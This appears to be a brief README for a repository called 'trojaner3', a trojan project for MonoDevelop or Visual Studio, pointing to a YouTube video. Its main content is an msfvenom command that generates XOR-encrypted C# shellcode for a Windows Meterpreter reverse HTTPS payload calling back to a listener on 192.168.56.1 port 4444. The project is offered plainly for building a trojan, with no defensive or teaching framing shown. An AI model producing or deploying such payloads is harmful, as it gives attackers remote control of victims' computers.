# trojaner3
trojan solutionfile for monodevelop or visual studio

watch my video on youtube https://youtu.be/H2gNLTTrSxs

to generate shellcode use:

msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.56.1 lport=4444 -f csharp --encrypt xor --encrypt-key a
